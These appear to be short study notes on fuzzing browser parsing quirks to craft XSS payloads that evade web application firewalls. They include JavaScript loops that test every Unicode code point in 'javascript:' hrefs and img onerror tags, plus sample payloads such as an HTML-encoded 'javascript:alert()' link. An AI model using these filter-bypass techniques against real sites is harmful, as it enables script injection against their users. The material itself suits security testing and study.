To get different JavaScript vectors to confuse WAF.

EX:

`javascript\n:` after browser rendering will be the same as `javascript:`

You should fuzz to reach `\n`, then in your payload, you will use the URL encoded of them.
equivalent.

EX:

1. make an <a> tag, change it's href attribute with different values: `javascript{fuzz}:` then,
comparing them with `javascript:` (which is the acceptable value) hoping to find something
that is interpreted the same in the browser.

```js
log=[];
let anchor = document.createElement('a');
for(let i=0; i<=0x10ffff;i++){                              // for all unicode characters
    anchor.href = `javascript${String.fromCodePoint(i)}:`;
    if(anchor.protocol === 'javascript:') {                 // check browser's rendering
    log.push(i);
    }
}
console.log(log)
```

you could also change the first part the scheme.

- if we got character 12: we also html encode it:

`<a href="&#12;javascript:alert()">Test</a>`

1. load a tag with an attribute (like onerror) that calls a function if triggered, so you
   will know if it's working.
   the function adds the working payloads to an array.

   could be found in: 04:04 22

```js
<img src onerror=alert(origin)>

const div = document.createElement('div');
const result = [];
const worked = p => result.push(p);
for (let i=0; i<0x10ffff; ++i) {
  div.innerHTML = `<img${String.fromCodePoint(i)}src${String.fromCodePoint(i)}onerror=worked(${i})>`;
}
document.body.appendChild(div);

```

----

1. `{FUZZ}java{FUZZ}script{FUZZ}:` it could be anywhere.
